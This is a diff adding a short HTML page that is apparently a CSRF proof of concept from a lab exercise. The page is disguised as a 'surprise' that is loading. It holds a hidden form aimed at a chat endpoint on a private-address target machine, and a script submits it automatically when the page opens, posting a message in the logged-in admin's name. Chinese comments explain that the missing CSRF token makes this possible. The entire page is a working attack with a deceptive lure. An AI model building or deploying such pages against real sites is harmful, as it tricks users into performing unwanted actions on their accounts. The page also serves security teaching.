@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>送你一个惊喜</title>
+</head>
+<body>
+    <h2>正在为你加载惊喜内容，请稍候...</h2>
+    
+    <!-- 这是一个隐藏的表单，目标直指靶机的聊天室消息处理接口 -->
+    <!-- 因为没有 CSRF Token 保护，我们可以从外部直接向靶机提交 POST 请求 -->
+    <form id="csrf_form" action="http://192.168.124.82/chat.php" method="POST" style="display:none;">
+        <!-- 这里是我们预先帮 admin 填好的恶意消息内容 -->
+        <input type="text" name="message" value="哈哈哈哈哈，攻击大王提醒你中陷阱了">
+    </form>
+
+    <!-- 核心动作：网页一打开，立刻用 JavaScript 在后台悄悄提交这个表单 -->
+    <script>
+        document.getElementById('csrf_form').submit();
+    </script>
+</body>
+</html>
